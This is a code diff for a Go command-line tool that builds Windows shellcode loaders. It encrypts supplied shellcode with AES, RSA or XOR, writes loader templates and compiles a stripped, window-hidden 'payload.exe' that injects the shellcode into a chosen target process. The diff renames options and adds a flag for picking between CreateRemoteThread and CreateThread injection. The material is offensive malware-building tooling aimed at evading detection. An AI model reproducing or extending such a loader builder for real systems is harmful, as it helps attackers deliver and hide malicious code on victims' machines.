@@ -51,7 +51,7 @@ func GetParser(opts *Options) *cobra.Command {
 			fmt.Printf("%s\n\n", ASCII_ART)
 
 			/* later, we will call "go build" on a golang project, so we need to set up the project tree */
-			err := tools.CreateTmpProjectRoot(opts.Outdir)
+			err := tools.CreateTmpProjectRoot(opts.OutName)
 			if err != nil {
 				fmt.Printf("[!] Error generating project root: %s\n", err)
 				os.Exit(1)
@@ -107,7 +107,7 @@ func GetParser(opts *Options) *cobra.Command {
 			}
 
 			/* write decryption routine template */
-			err = tools.WriteToFile(opts.Outdir, "encrypt.go", template)
+			err = tools.WriteToFile(opts.OutName, "encrypt.go", template)
 			if err != nil {
 				panic(err)
 			}
@@ -115,23 +115,28 @@ func GetParser(opts *Options) *cobra.Command {
 			/* write main execution template */
 			encodedShellcode := tools.EncodeForInterpolation(encType, encrypted)
 			encodedKey := tools.EncodeForInterpolation(encType, []byte(opts.Key))
-			err = tools.WriteToFile(opts.Outdir, "main.go", tools.GetMainTemplate(encType.String(), encodedKey, encodedShellcode))
-			if err != nil {
-				panic(err)
-			}
-
-			err = tools.WriteToFile(opts.Outdir, "exec.go", loaders.GetCRTTemplate(opts.Target))
+			err = tools.WriteToFile(opts.OutName, "main.go", tools.GetMainTemplate(encType.String(), encodedKey, encodedShellcode))
 			if err != nil {
 				panic(err)
 			}
 
 			os.Setenv("GOOS", opts.OS)
-			os.Setenv("GOARCH", opts.arch)
+			os.Setenv("GOARCH", opts.Arch)
 
-			fmt.Printf("\n[+] Template (CRT) written to tmp directory. Compiling...\n")
+            templateFunc :=  loaders.SelectTemplate(opts.Technique)
+            if templateFunc == nil {
+                fmt.Printf("[!] Could not find a technique for this method: %s\n", opts.Technique)
+                os.Exit(1)
+            }
 
+			err = tools.WriteToFile(opts.OutName, "exec.go", templateFunc(opts.Target))
+			if err != nil {
+				panic(err)
+			}
+
+			fmt.Printf("\n[+] Template (%s) written to tmp directory. Compiling...\n", opts.Technique)
 			execCmd := exec.Command("go", "build", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.exe", ".")
-			execCmd.Dir = opts.Outdir
+			execCmd.Dir = opts.OutName
 
 			_, stderr := execCmd.Output()
 
@@ -139,9 +144,9 @@ func GetParser(opts *Options) *cobra.Command {
 				fmt.Printf("[!] error compiling shellcode: %s\n", stderr.Error())
 				fmt.Printf(
 					"\nYou may try to run the following command in %s to find out what happend: GOOS=%s GOARCH=%s %s\n\n",
-					opts.Outdir,
+					opts.OutName,
 					opts.OS,
-					opts.arch,
+					opts.Arch,
 					"go build -ldflags \"-s -w -H=windowsgui\" -o payload.exe",
 				)
 
@@ -149,11 +154,12 @@ func GetParser(opts *Options) *cobra.Command {
 				os.Exit(1)
 			}
 
-			fullpath := fmt.Sprintf("%s/payload.exe", opts.Outdir)
-			finalName := fmt.Sprintf("./%s.exe", opts.Outdir)
+            /* FIXME(djnn): if path is a distant directory, this is will not work */
+			fullpath := fmt.Sprintf("%s/payload.exe", opts.OutName)
+			finalName := fmt.Sprintf("./%s.exe", opts.OutName)
 			tools.MoveFile(fullpath, finalName)
 
-			os.RemoveAll(opts.Outdir)
+			os.RemoveAll(opts.OutName)
 
 			println("[+] Done!")
 		},
@@ -161,11 +167,12 @@ func GetParser(opts *Options) *cobra.Command {
 
 	defaults := GetDefaultCLIOptions()
 
-	cmd.PersistentFlags().StringVarP(&opts.Outdir, "out", "f", defaults.Outdir, "output name")
+	cmd.PersistentFlags().StringVarP(&opts.OutName, "out", "f", defaults.OutName, "output name")
 	cmd.PersistentFlags().StringVarP(&opts.ShellcodePath, "shellcode", "s", defaults.ShellcodePath, "shellcode path")
 	cmd.PersistentFlags().StringVarP(&opts.Target, "process", "p", defaults.Target, "target process to inject shellcode to")
+    cmd.PersistentFlags().StringVarP(&opts.Technique, "technique", "t", defaults.Technique, "shellcode-loading technique (allowed: CRT, CreateThread)")
 
-	cmd.PersistentFlags().StringVarP(&opts.arch, "arch", "r", defaults.arch, "architecture compilation target")
+	cmd.PersistentFlags().StringVarP(&opts.Arch, "arch", "r", defaults.Arch, "architecture compilation target")
 	cmd.PersistentFlags().StringVarP(&opts.OS, "os", "o", defaults.OS, "OS compilation target")
 
 	cmd.PersistentFlags().VarP(&opts.Encryption, "encryption", "e", "encryption method. (allowed: AES, RSA, XOR)")
